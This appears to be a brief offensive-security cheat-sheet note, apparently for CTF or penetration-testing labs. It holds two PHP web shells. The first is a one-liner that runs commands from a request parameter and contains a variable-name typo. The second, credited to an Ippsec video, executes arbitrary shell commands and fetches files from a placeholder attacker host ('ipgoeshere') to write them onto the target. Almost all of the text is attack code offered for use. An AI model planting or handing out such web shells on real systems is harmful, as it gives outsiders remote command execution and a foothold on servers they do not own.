* One liner for code execution:
```php
<?php system(_$REQUEST['cmd']); ?> 
```
* Code snippet taken from Ippsecs video, allows code execution and file upload
	* Good for Windows machines -> makes file upload much easier
	* reference bastard notes for usage
```php
<?php
 if (isset($_REQUEST['fupload'])){
  file_put_contents($_REQUEST['fupload'], file_get_contents("http://ipgoeshere:portbeingservedon/" . $_REQUEST['fupload']));
  };
 if (isset($_REQUEST['fexec'])){
  echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
  };
  ?>
```